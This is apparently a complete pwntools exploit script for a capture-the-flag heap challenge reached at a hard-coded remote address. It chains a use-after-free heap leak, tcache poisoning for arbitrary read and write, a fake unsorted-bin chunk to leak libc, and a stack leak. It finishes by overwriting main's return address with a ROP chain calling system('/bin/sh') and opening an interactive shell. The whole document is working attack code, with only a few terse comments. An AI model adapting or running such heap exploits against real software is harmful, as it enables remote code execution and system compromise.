from pwn import *

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("chall")
libc = ELF("libc.so.6")

if args.REMOTE:
#	p = remote("127.0.0.1", 5001)
	p = remote("65.109.185.145", 5001)
	if args.GDB:
		pause()
else:
	p = elf.process()
	if args.GDB:
		gdb.attach(p, gdbscript="set max-visualize-chunk-size 0x200")
		pause()

total_cmds = 0
def xor_cell(r, c, x):
	global total_cmds
	total_cmds += 1
	p.sendlineafter(b"> ", b"+ %d %d %d" % (r, c, x))

def get_sum(r1, c1, r2, c2):
	global total_cmds
	total_cmds += 1
	p.sendlineafter(b"> ", b"? %d %d %d %d" % (r1, c1, r2, c2))
	p.recvuntil(b"Result: ")
	return int(p.recvline().strip())

def free_row(r):
	global total_cmds
	total_cmds += 1
	p.sendlineafter(b"> ", b"x %d" % r)

# find a range to get the memory value of fen[idx] with
def fen_range_for_mem(idx):
	idx += 1
	l = idx - (idx & (-idx))
	return l, idx - 1

def read_fen1(r1, r2, idx):
	l, r = fen_range_for_mem(idx)
	return get_sum(r1, l, r2, r)

def read_fen8(r1, r2):
	res = []
	for i in range(8):
		res.append(read_fen1(r1, r2, i))
	return u64(bytes(res))

def write_fen1(leaf, l, r, idx, val):
	prev_val = read_fen1(l, r, idx)
	to_xor = val ^ prev_val
	if (to_xor != 0):
		xor_cell(leaf, idx, to_xor)

def write_fen8(leaf, l, r, val):
	valbytes = p64(val)
	for i in range(8):
		write_fen1(leaf, l, r, i, valbytes[i])

xor_cell(0, 0, 1)
xor_cell(0x40, 0, 2)
xor_cell(0x42, 0, 3)
free_row(0)
heap_leak = (read_fen8(0, 0) << 12)
log.success("heap leak = " + hex(heap_leak))

leftptr_addr = heap_leak + 0x770	# &parent[leaf #0x40]->left
write_fen8(0, 0, 0x3f, leftptr_addr ^ (heap_leak >> 12))
# pause()
xor_cell(0x41, 0, 0)
xor_cell(0x43, 0, 0)	# allocated at leftptr_addr
# pause()

def arb_read(addr):
	write_fen8(0x43, 0x43, 0x43, addr)
	return read_fen8(0x40, 0x40)

#print("arb read:", hex(arb_read(heap_leak + 0x38)))

def arb_write8(addr, val):
	write_fen8(0x43, 0x43, 0x43, addr)
	write_fen8(0x40, 0x40, 0x40, val)

# arb_write8(heap_leak + 0x38, 0xdeadbeef1234)

fake_unsorted_chunk = heap_leak + 0x900
log.success("fake unsorted chunk = " + hex(fake_unsorted_chunk))
arb_write8(fake_unsorted_chunk+8, 0x501)
arb_write8(fake_unsorted_chunk+0x500+8, 0x21)
arb_write8(fake_unsorted_chunk+0x500+0x20+8, 0x21)

for i in range(8):
	write_fen1(0x43, 0x43, 0x43, 8+i, p64(fake_unsorted_chunk+0x10)[i])
free_row(0x41)

libc.address = arb_read(fake_unsorted_chunk + 0x10) - 0x203b20
log.success("libc base = " + hex(libc.address))

argv_arr = arb_read(libc.address + 0x2046e0)
log.success("stack leak = " + hex(argv_arr))

main_ret_addr = argv_arr - 0x120

ropper = ROP(libc)
pop_rdi = ropper.find_gadget(["pop rdi", "ret"]).address
ret_gadget = ropper.find_gadget(["ret"]).address
rop1 = p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(ret_gadget) + p64(libc.sym["system"])

write_fen8(0x43, 0x43, 0x43, main_ret_addr)
for i in range(len(rop1)):
	write_fen1(0x40, 0x40, 0x40, i, rop1[i])

p.sendlineafter(b"> ", b"A")

print("total cmds:", total_cmds)
p.interactive()
